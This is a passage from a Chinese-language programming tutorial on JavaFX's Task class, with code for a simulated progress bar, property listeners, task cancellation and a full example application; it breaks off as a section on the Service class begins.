java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateValue</span><span class="hljs-params">(Number value)</span> &#123;<br>    <span class="hljs-built_in">super</span>.updateValue(value);<br>    <span class="hljs-comment">// 在这里返回结果</span><br>    <span class="hljs-comment">// 这里执行是在fx线程，返回true</span><br>    System.out.println(Platform.isFxApplicationThread());<br>    System.out.println(value);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 这里是任务主体</span><br>    <span class="hljs-comment">// 判断是否是fx线程，这里返回的是false</span><br>    System.out.println(Platform.isFxApplicationThread());<br>&#125;<br></code></pre></td></tr></table></figure><p>设置这样的一个任务，模拟进度条，每次随机增长，直到达到设定值，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 这里是任务主体</span><br><br>    <span class="hljs-comment">// 设置任务名称</span><br>    <span class="hljs-built_in">this</span>.updateTitle(<span class="hljs-string">&quot;任务名称&quot;</span>);<br><br>    <span class="hljs-type">double</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br>    <span class="hljs-type">Random</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>    <span class="hljs-type">double</span> <span class="hljs-variable">cur</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">double</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (cur &lt; sum)&#123;<br>        cur = cur + rand.nextInt(<span class="hljs-number">100</span>);<br>        <span class="hljs-keyword">if</span> (cur &gt; sum)&#123;<br>            cur = sum;<br>        &#125;<br>        progress = cur / sum;<br><br>        <span class="hljs-comment">// 更新进度</span><br>        <span class="hljs-built_in">this</span>.updateProgress(cur, sum);<br><span class="hljs-comment">// 更新任务信息</span><br>        <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.5</span>)&#123;<br>            <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;请耐性等待&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.8</span>)&#123;<br>            <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;马上就好&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;即将完成&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;完成了!&quot;</span>);<br>        &#125;<br><br>        Thread.sleep(<span class="hljs-number">200</span>);<br><br>    &#125;<br><span class="hljs-comment">// 这里返回了任务进度</span><br>    <span class="hljs-keyword">return</span> progress;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>对于任务设置监听事件，监听任务中的状态变化或者信息输出等；需要注意在任务类中重写方法与设置监听事件两者是相同的，但更推荐设置监听事件；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 任务进度监听，在任务中调用的 this.updateProgress(cur, sum) 会在这里处理</span><br><span class="hljs-comment">// this.updateProgress(cur, sum) 有两个参数：当前数和总数</span><br><span class="hljs-comment">// 而监听事件的值是两者的比值，表示进度</span><br>myTask.progressProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        progressBar.setProgress(newValue.doubleValue());<br><br>    &#125;<br><br>&#125;);<br><br><br><span class="hljs-comment">// 当任务名称改变时会触发事件</span><br><span class="hljs-comment">// 在任务中调用了 this.updateTitle(&quot;任务名称&quot;) 会触发该事件</span><br>myTask.titleProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String&gt; observable, String oldValue, String newValue)</span> &#123;<br>        l3.setText(newValue);<br>    &#125;<br>&#125;);<br><br><br><span class="hljs-comment">// 任务结束后得到返回值</span><br><span class="hljs-comment">// 由于任务中返回的是进度，所以这里判断进度为1时输出&quot;完成&quot;</span><br>myTask.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>        <span class="hljs-keyword">if</span> (newValue.doubleValue() == <span class="hljs-number">1</span>)&#123;<br>            l2.setText(<span class="hljs-string">&quot;完成&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;);<br><br><br><span class="hljs-comment">// 设置任务执行中的信息会触发该事件</span><br><span class="hljs-comment">// 在任务中调用了 this.updateMessage(&quot;请耐性等待&quot;) 触发该事件</span><br>myTask.messageProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String&gt; observable, String oldValue, String newValue)</span> &#123;<br>        l4.setText(newValue);<br>    &#125;<br>&#125;);<br><br><br><span class="hljs-comment">// 任务状态监听事件</span><br><span class="hljs-comment">// 当状态改变时会触发该事件，任务状态包括</span><br><span class="hljs-comment">// * READY</span><br><span class="hljs-comment">// * SCHEDULED</span><br><span class="hljs-comment">// * RUNNING</span><br><span class="hljs-comment">// * SUCCEEDED</span><br><span class="hljs-comment">// * CANCELLED</span><br><span class="hljs-comment">// * FAILED</span><br>myTask.stateProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Worker.State&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Worker.State&gt; observable, Worker.State oldValue, Worker.State newValue)</span> &#123;<br>        System.out.println(newValue.toString());<br>        l1.setText(newValue.toString());<br>    &#125;<br>&#125;);<br><br><br><span class="hljs-comment">// 任务异常监听事件</span><br><span class="hljs-comment">// 当任务未能正常完成时会触发该事件，取消事件也会调用该事件</span><br>myTask.exceptionProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Throwable&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Throwable&gt; observable, Throwable oldValue, Throwable newValue)</span> &#123;<br>        <span class="hljs-comment">// 异常监听</span><br>        System.out.println(<span class="hljs-string">&quot;异常事件监听 &quot;</span> + newValue.getMessage());<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>另外需要设置任务的取消，添加按钮绑定事件，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">cancelBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>        <span class="hljs-comment">// 取消任务</span><br>        myTask.cancel();<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>为了保证任务能够正常的取消，在任务中需要另外进行任务取消的判断，在任务循环中添加判断，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (isCancelled())&#123;<br>    <span class="hljs-comment">// 任务取消需要在这里另外判断一下</span><br>    <span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行任务可以得到结果，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004143828479.png" alt="image-20221004143828479"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004143838231.png" alt="image-20221004143838231"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004143843681.png" alt="image-20221004143843681"></p><p><strong>特别注意</strong>：<code>Task</code>设置的任务只能执行一次，如果再次点击<code>开始</code>会出错；如果执行任务时界面关闭了，那么任务仍然会执行；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> javafxTask;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.beans.value.ChangeListener;<br><span class="hljs-keyword">import</span> javafx.beans.value.ObservableValue;<br><span class="hljs-keyword">import</span> javafx.concurrent.Task;<br><span class="hljs-keyword">import</span> javafx.concurrent.Worker;<br><span class="hljs-keyword">import</span> javafx.event.ActionEvent;<br><span class="hljs-keyword">import</span> javafx.event.EventHandler;<br><span class="hljs-keyword">import</span> javafx.geometry.Pos;<br><span class="hljs-keyword">import</span> javafx.scene.Scene;<br><span class="hljs-keyword">import</span> javafx.scene.control.Button;<br><span class="hljs-keyword">import</span> javafx.scene.control.Label;<br><span class="hljs-keyword">import</span> javafx.scene.control.ProgressBar;<br><span class="hljs-keyword">import</span> javafx.scene.layout.AnchorPane;<br><span class="hljs-keyword">import</span> javafx.scene.layout.HBox;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><br><span class="hljs-keyword">import</span> java.util.Random;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fxTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Button</span> <span class="hljs-variable">startBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;开始&quot;</span>);<br>        <span class="hljs-type">Button</span> <span class="hljs-variable">cancelBt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;取消&quot;</span>);<br><br>        <span class="hljs-type">ProgressBar</span> <span class="hljs-variable">progressBar</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProgressBar</span>(<span class="hljs-number">0</span>);<br>        progressBar.setPrefWidth(<span class="hljs-number">200</span>);<br><br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;state&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;value&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;title&quot;</span>);<br>        <span class="hljs-type">Label</span> <span class="hljs-variable">l4</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Label</span>(<span class="hljs-string">&quot;message&quot;</span>);<br><br>        <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>();<br>        hBox.setAlignment(Pos.CENTER);<br>        hBox.setSpacing(<span class="hljs-number">10.0</span>);<br><br>        hBox.getChildren().addAll(startBt, cancelBt, progressBar, l1, l2, l3, l4);<br><br>        <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>        anchorPane.setStyle(<span class="hljs-string">&quot;-fx-background-color: #7bb9b0;&quot;</span>);<br>        anchorPane.getChildren().add(hBox);<br><br>        AnchorPane.setLeftAnchor(hBox, <span class="hljs-number">100.0</span>);<br>        AnchorPane.setTopAnchor(hBox, <span class="hljs-number">100.0</span>);<br><br>        <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>        primaryStage.setScene(scene);<br>        primaryStage.setTitle(<span class="hljs-string">&quot;javaFX&quot;</span>);<br>        primaryStage.setWidth(<span class="hljs-number">700</span>);<br>        primaryStage.setHeight(<span class="hljs-number">500</span>);<br>        primaryStage.show();<br><br>        <span class="hljs-type">MyTask</span> <span class="hljs-variable">myTask</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyTask</span>();<br><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(myTask);<br><br>        startBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                thread.start();<br>            &#125;<br>        &#125;);<br><br><br>        cancelBt.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>                <span class="hljs-comment">// 取消任务</span><br>                myTask.cancel();<br>            &#125;<br>        &#125;);<br><br>        myTask.progressProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                <span class="hljs-comment">// 进度</span><br>                System.out.println(<span class="hljs-string">&quot;任务进度监听 &quot;</span> + newValue.doubleValue());<br>                progressBar.setProgress(newValue.doubleValue());<br>            &#125;<br>        &#125;);<br><br>        myTask.titleProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String&gt; observable, String oldValue, String newValue)</span> &#123;<br>                <span class="hljs-comment">// 标题</span><br>                l3.setText(newValue);<br>            &#125;<br>        &#125;);<br><br>        myTask.valueProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Number&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Number&gt; observable, Number oldValue, Number newValue)</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;返回值监听 &quot;</span> + newValue.doubleValue());<br>                <span class="hljs-keyword">if</span> (newValue.doubleValue() == <span class="hljs-number">1</span>)&#123;<br>                    l2.setText(<span class="hljs-string">&quot;完成&quot;</span>);<br>                &#125;<br>            &#125;<br>        &#125;);<br><br>        myTask.messageProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;String&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends String&gt; observable, String oldValue, String newValue)</span> &#123;<br>                l4.setText(newValue);<br>            &#125;<br>        &#125;);<br><br>        myTask.stateProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Worker.State&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Worker.State&gt; observable, Worker.State oldValue, Worker.State newValue)</span> &#123;<br>                System.out.println(newValue.toString());<br>                l1.setText(newValue.toString());<br>            &#125;<br>        &#125;);<br><br>        myTask.exceptionProperty().addListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangeListener</span>&lt;Throwable&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">changed</span><span class="hljs-params">(ObservableValue&lt;? extends Throwable&gt; observable, Throwable oldValue, Throwable newValue)</span> &#123;<br>                <span class="hljs-comment">// 异常监听</span><br>                System.out.println(<span class="hljs-string">&quot;异常事件监听 &quot;</span> + newValue.getMessage());<br>            &#125;<br>        &#125;);<br><br>    &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyTask</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Task</span>&lt;Number&gt; &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Number <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 这里是任务主体</span><br>        <span class="hljs-comment">// 判断是否是fx线程，这里返回的是false</span><br>        <span class="hljs-comment">// System.out.println(Platform.isFxApplicationThread());</span><br><br>        <span class="hljs-comment">// 任务名称</span><br>        <span class="hljs-built_in">this</span>.updateTitle(<span class="hljs-string">&quot;任务名称&quot;</span>);<br><br>        <span class="hljs-type">double</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br>        <span class="hljs-type">Random</span> <span class="hljs-variable">rand</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">double</span> <span class="hljs-variable">cur</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">double</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (cur &lt; sum)&#123;<br>            cur = cur + rand.nextInt(<span class="hljs-number">100</span>);<br>            <span class="hljs-keyword">if</span> (cur &gt; sum)&#123;<br>                cur = sum;<br>            &#125;<br>            progress = cur / sum;<br><br>            <span class="hljs-built_in">this</span>.updateProgress(cur, sum);<br><br>            <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.5</span>)&#123;<br>                <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;请耐性等待&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">0.8</span>)&#123;<br>                <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;马上就好&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &lt; <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;即将完成&quot;</span>);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (progress &gt;= <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-built_in">this</span>.updateMessage(<span class="hljs-string">&quot;完成了!&quot;</span>);<br>            &#125;<br><br><br>            Thread.sleep(<span class="hljs-number">200</span>);<br><br>            <span class="hljs-keyword">if</span> (isCancelled())&#123;<br>                <span class="hljs-comment">// 任务取消需要在这里另外判断一下</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">return</span> progress;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p><code>Service</code>类比<code>Task</code>类会更加的灵活，可以对任务进行重置、重启等操作。</p><p>在<code>Task</code>中的布局总新增一些内容，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 